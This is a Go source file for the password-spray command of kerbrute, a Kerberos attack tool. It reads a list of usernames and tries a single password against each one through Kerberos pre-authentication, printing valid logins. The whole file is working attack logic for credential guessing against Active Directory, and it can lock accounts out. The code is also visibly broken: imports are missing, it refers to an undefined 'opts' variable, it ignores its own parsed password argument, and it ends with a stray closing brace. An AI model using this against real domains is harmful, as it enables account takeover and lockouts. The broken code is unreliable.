package cmd

import (
	"fmt"
	"log"

	"github.com/ropnop/kerbrute/session"
	"github.com/spf13/cobra"
)

var usernameList string
var password string

var passwordSprayCmd = &cobra.Command{
	Use:   "passwordspray [flags] <username_wordlist> <password>",
	Short: "Test a single password against a list of users",
	Long: `Will perform a password spray attack against a list of users using Kerberos Pre-Authentication by requesting a TGT from the KDC.
If no domain controller is specified, the tool will attempt to look one up via DNS SRV records.
A full domain is required. This domain will be capitalized and used as the Kerberos realm when attempting the bruteforce.
Succesful logins will be displayed on stdout.
WARNING: use with caution - failed Kerberos pre-auth can cause account lockouts`,
	Args: cobra.ExactArgs(2),
	Run:  passwordSpray,
}

func init() {
	rootCmd.AddCommand(passwordSprayCmd)
}

func passwordSpray(cmd *cobra.Command, args []string) {
	usernamelist := args[0]
	password := args[1]
	domain, _ := cmd.Flags().GetString("domain")
	domainController, _ := cmd.Flags().GetString("dc")
	fmt.Printf("domain: %v\ndc: %v\n", domain, domainController)
	 verbose, _ := cmd.Flags().GetBool("verbose")
	kSession := session.NewKerbruteSession(domain, domainController, verbose)

	log.Println("Using KDC(s):")
	for _, v := range kSession.Kdcs {
		log.Printf("\t%s\n", v)
	}

	file, err := os.Open(usernamelist)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var username string
	for scanner.Scan() {
		username = scanner.Text()
		if ok, err := kSession.TestLogin(username, opts.Args.Password); ok {
			log.Printf("[!] Valid Login: \t%v : %v", username, opts.Args.Password)
		} else {
			kSession.HandleKerbError(err)
		}
	}
	log.Println("...done!")

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}

}

}
